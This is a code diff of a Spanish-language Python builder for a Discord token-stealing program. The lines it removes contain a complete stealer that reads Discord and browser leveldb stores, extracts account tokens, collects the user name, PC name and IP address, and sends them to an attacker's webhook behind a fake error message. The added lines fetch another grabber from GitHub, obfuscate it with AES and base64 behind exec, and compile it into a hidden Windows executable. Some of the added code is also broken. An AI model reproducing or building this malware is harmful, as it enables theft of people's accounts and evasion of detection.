@@ -1,114 +1,54 @@
-from colorama import Fore
-import time
-import os
+import os, shutil, requests, base64, random,time
 
+from Crypto.Cipher import AES
+from Crypto import Random
+from pystyle import Colors
 
 def create_grabber():
-    webhookUrl = input(Fore.BLUE + f"\n [>] Webhook: ")
+    webhookUrl = input(f"\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Webhook: {Colors.white}")
     if "https://discord.com/api/webhooks" in webhookUrl:
-        
-        fileName = input(f" [>] Nombre del archivo: " + Fore.RESET)
-
-        print(Fore.GREEN + f"\n [+] Escribiendo codigo..." + Fore.RESET)
+        fileName = input(f" {Colors.purple}[{Colors.light_blue}>{Colors.purple}] Nombre del archivo: {Colors.white}")
+        print(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} Escribiendo codigo...")
         time.sleep(.3)
+    src = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", webhookUrl) #Rdimo token grabber
+    with open(f"{fileName}.py", 'w', errors="ignore") as f:
+        f.write(src)
 
-        try:
-            with open(f"./output/{fileName}.py", "w") as file:
-                file.write("""
-import os
-import re
-import json
+def tortuga(_str):
+    for letra in _str:
+        sys.stdout.write(letra);sys.stdout.flush();sleep(0.03)
 
-from urllib.request import Request, urlopen
+    print(f"\n {Colors.purple}[{Colors.red}!{Colors.purple}]{Colors.white} ¿Deseas ofuscar {fileName}.exe?")
+    siono = input(f'\n {Colors.purple}[{Colors.light_blue}>{Colors.purple}] {Colors.purple}y{Colors.light_blue}/{Colors.red}n: {Colors.white}')
+    if siono.lower() == "y" or siono.lower() == "yes":
+        IV = Random.new().read(AES.block_size)
+        key = u''
+        for i in range(8):
+            key = key + chr(random.randint(0x4E00, 0x9FA5))
 
-def get_tokens(path):
-    tokens = []
+        with open(f'{fileName}.py') as f: 
+            _file = f.read()
+            imports = ''
+            input_file = _file.splitlines()
+            for i in input_file:
+                if i.startswith("import") or i.startswith("from"):
+                    imports += i+';'
 
-    for file in [i for i in os.listdir(path) if i.endswith('.ldb') or i.endswith('.log')]:
-        with open(f"{path}\\\\{file}", "r", errors='ignore') as file:
-            for line in file.readlines():
-                for tkn in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', line.strip()):
-                    if tkn not in tokens:
-                        tokens.append(tkn)
-                for tkn in re.findall(r'mfa\\.[\\w-]{84}', line.strip()):
-                    if tkn not in tokens:
-                        tokens.append(tkn)
+        with open(f'{fileName}.py', "wb") as f:
+            encodedBytes = base64.b64encode(_file.encode())
+            obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
+            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())
 
-    return tokens
-
-local = os.getenv('LOCALAPPDATA')
-roaming = os.getenv('APPDATA')
-
-paths = {
-    'Discord': roaming + '\\Discord',
-    'Discord Canary': roaming + '\\discordcanary',
-    'Lightcord': roaming + '\\Lightcord',
-    'Discord PTB': roaming + '\\discordptb',
-    'Opera': roaming + '\\Opera Software\\Opera Stable',
-    'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-}
-
-grabbedTokens = {}
-
-for key, val in paths.items():
-    if os.path.exists(f"{val}\\\\Local Storage\\\\leveldb"):
-        grab = get_tokens(f"{val}\\\\Local Storage\\\\leveldb")
-        if len(grab) != 0:
-            grabbedTokens[key] = grab
-
-message = "```ini\\n"
-
-try:
-    req = Request("http://httpbin.org/ip")
-    ip = json.loads(urlopen(req, timeout = 3).read().decode())["origin"]
-except Exception as e:
-    ip = "Unable to fetch"
-
-pc_name = os.getenv('COMPUTERNAME') if os.getenv('COMPUTERNAME') is not None else os.uname().nodename
-user = os.getenv('username')
-
-message += f"[ User Data ]\\n - Username: {user}\\n - Nombre del pc: {pc_name}\\n - IP: {ip}\\n\\n"
-
-if len(grabbedTokens) == 0:
-    message += "[ No se han encontrado tokens ]"
-else:
-    for key, val in grabbedTokens.items():
-        message += f"[ {key} ]\\n - "
-        message += "\\n - ".join(val)
-        message += "\\n\\n"
-    message += "```"
-
-headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
-payload = json.dumps({'content': message})
-
-req = Request(
-    "~~TOKENURLHERE~~",
-    data=payload.encode(),
-    headers=headers
-)
-
-urlopen(req)
-
-print("Tu pc no es compatible con este tipo de programas.")
-input("Presione enter para salir.")
-    """.replace("~~TOKENURLHERE~~", webhookUrl))
-
-        except Exception as e:
-            print(Fore.RED + f" [-] Error al escribir el archivo: {e}"+ Fore.RESET)
-        else:
-            
-            print(Fore.GREEN + f" [+] Archivo escrito como: {fileName}.py | Este archivo lo puedes encontrar en la carpeta *output*" + Fore.RESET)
-        
-        
-    else:
-        print(Fore.RESET + Fore.YELLOW + ' [-] Webhook invalida'+ Fore.RESET)
+    print(f"\n {Colors.purple}[{Colors.light_blue}+{Colors.purple}]{Colors.light_green} Un momento estamos contruyendo {fileName}.exe, esto tomara unos minutos. {Colors.gray}\n")
+    os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
     try:
-        os.system('pip install pyinstaller')
-        filedir = f"./output/{fileName}.py"
-        os.system(f'pyinstaller --specpath ./Build/ --distpath ./output/exefiles/ --onefile {filedir}')
-        os.system('cls')
-        print(Fore.GREEN + '[+] Archivo convertido a .exe, lo puedes encontrar en ./output/exefiles' + Fore.RESET)
-    except:
-        print(Fore.RED + '[-] Error al convertir el archivo en exe' + Fore.RESET)
+        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
+        shutil.rmtree('build')
+        shutil.rmtree('dist')
+        shutil.rmtree('__pycache__')
+        os.remove(f'{fileName}.spec')
+        os.remove(f'{fileName}.py')
+    except FileNotFoundError:
+        pass
+
+    print(f"\n{Colors.purple}EL archivo {fileName}.exe ha sido creado correctamente\n")
